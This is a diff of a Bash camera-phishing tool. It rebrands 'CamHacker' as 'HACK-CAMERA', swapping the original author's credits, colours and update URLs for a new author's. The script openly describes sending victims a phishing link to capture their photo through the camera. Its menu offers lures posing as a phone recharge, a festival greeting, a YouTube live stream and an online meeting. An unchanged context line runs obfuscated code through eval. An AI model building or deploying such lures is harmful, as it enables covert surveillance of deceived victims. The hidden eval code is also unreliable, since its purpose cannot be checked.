@@ -1,15 +1,13 @@
 #!/bin/bash
 
-# CamHacker
-# Version    : 1.3
-# Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra
-# Github     : https://github.com/KasRoudra
-# Email      : kasroudrakrd@gmail.com
-# Credits    : Noob-Hackers, TechChipNet, LinuxChoice
-# Date       : 5-09-2021
+# HACK-CAMERA
+# Version    : 1.5
+# Description: HACK-CAMERA is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
+# Author     : X PHANTOM (PH4N70M)
+# Github     : https://github.com/XPH4N70M
+# Date       : 29-05-2022
 # License    : MIT
-# Copyright  : KasRoudra (2021-2022)
+# Copyright  : X PHANTOM PH4N7OM (2022-2023)
 # Language   : Shell
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -17,7 +15,7 @@
 : '
 MIT License
 
-Copyright (c) 2022 KasRoudra
+Copyright (c) 2022 X PHANTOM (PH4N7OM)
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -53,15 +51,15 @@ white="\033[0;37m"
 nc="\033[00m"
 
 # Output snippets
-info="${cyan}[${white}+${cyan}] ${yellow}"
+info="${red}[${white}+${red}] ${cyan}"
 info2="${blue}[${white}•${blue}] ${yellow}"
-ask="${green}[${white}?${green}] ${purple}"
-error="${yellow}[${white}!${yellow}] ${red}"
-success="${cyan}[${white}√${cyan}] ${green}"
+ask="${red}[${white}?${red}] ${purple}"
+error="${cyan}[${white}!${cyan}] ${red}"
+success="${red}[${white}√${red}] ${green}"
 
 
 
-version="1.3"
+version="1.5"
 
 cwd=`pwd`
 
@@ -181,7 +179,7 @@ eval "$N0q$x$Hc2$rQW"
 
 # Termux
 if [[ -d /data/data/com.termux/files/home ]]; then
-    termux-fix-shebang ch.sh
+    termux-fix-shebang hack_camera.sh
     termux=true
 else
     termux=false
@@ -436,13 +434,13 @@ if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
     changelog=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log`
     clear
     echo -e "$logo"
-    echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
-        printf "${ask}Do you want to update CamHacker?${yellow}[y/n] > $green"
+    echo -e "${info}HACK-CAMERA has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
+        printf "${ask}Do you want to update HACK-CAMERA?${yellow}[y/n] > $green"
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
-            echo -e "\n${success}CamHacker updated successfully!!"
+            cd .. && rm -rf HACK-CAMERA hack_camera && git clone https://github.com/XPH4N70M/HACK-CAMERA
+            echo -e "\n${success}HACK-CAMERA updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
             echo -e "${purple}[•] Changelog:\n${blue}${changelog}"
             fi
@@ -476,23 +474,23 @@ echo -e "$logo"
 sleep 1
 echo -e "${ask}Choose an option:
 
-${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
-${cyan}[${white}2${cyan}] ${yellow}Festival
-${cyan}[${white}3${cyan}] ${yellow}Live Youtube
-${cyan}[${white}4${cyan}] ${yellow}Online Meeting
-${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
-${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
-${cyan}[${white}t${cyan}] ${yellow}Change Default Tunneler (current: ${red}${TN}${yellow})
-${cyan}[${white}x${cyan}] ${yellow}About
-${cyan}[${white}m${cyan}] ${yellow}More tools
-${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
+${red}[${white}1${red}] ${cyan}Jio Recharge
+${red}[${white}2${red}] ${cyan}Festival
+${red}[${white}3${red}] ${cyan}Live Youtube
+${red}[${white}4${red}] ${cyan}Online Meeting
+${red}[${white}d${red}] ${cyan}Change Image Directory (current: ${red}${FOL}${yellow})
+${red}[${white}p${red}] ${cyan}Change Default Port (current: ${red}${PORT}${yellow})
+${red}[${white}t${red}] ${cyan}Change Default Tunneler (current: ${red}${TN}${yellow})
+${red}[${white}x${red}] ${cyan}About
+${red}[${white}m${red}] ${cyan}More tools
+${red}[${white}0${red}] ${cyan}Exit${blue}
 "
 sleep 1
 if [ -z $OPTION ]; then
     exit 1
 else
     if [[ $OPTION == true ]]; then
-        printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "${blue}\nXPhantom${nc}@${cyan}Hacker ${red}$ ${nc}"
         read option
     else
         option=$OPTION
@@ -504,7 +502,7 @@ fi
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name:${blue}\n\nXPhantom${nc}@${cyan}Hacker ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -515,7 +513,7 @@ fi
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${blue}\n\nXPhantom${nc}@${cyan}Hacker ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -535,7 +533,7 @@ fi
         echo -e "${success}Tunneler switched to ${TN} successfully!\n"
         sleep 2
     elif echo $option | grep -q "p"; then
-        printf "\n${ask}Enter Port:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter Port:${blue}\n\nXPhantom${nc}@${cyan}Hacker ${red}$ ${nc}"
         read pore
         if [ ! -z "${pore##*[!0-9]*}" ] ; then
             PORT=$pore;
@@ -546,7 +544,7 @@ fi
             sleep 2
         fi
     elif echo $option | grep -q "d"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter Directory:${blue}\n\nXPhantom${nc}@${cyan}Hacker ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -562,14 +560,13 @@ fi
         echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[KasRoudra]
-$red[Github]     ${cyan} :[https://github.com/KasRoudra]
-$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
-$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
-        printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+$red[Author]     ${cyan} :[XPHANTOM (PH4N70M)]
+$red[Github]     ${cyan} :[https://github.com/XPH4N70M]
+$red[join us]    ${cyan} :[https://bit.ly/3LAy80f]"
+        printf "${blue}\nXPhantom${nc}@${cyan}Hacker ${red}$ ${nc}"
         read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
+        xdg-open "https://github.com/XPH4N70M/XPH4N70M#My-Best-Works"
     elif echo $option | grep -q "0"; then
         echo -e "\n${success}Thanks for using!\n"
         exit 0
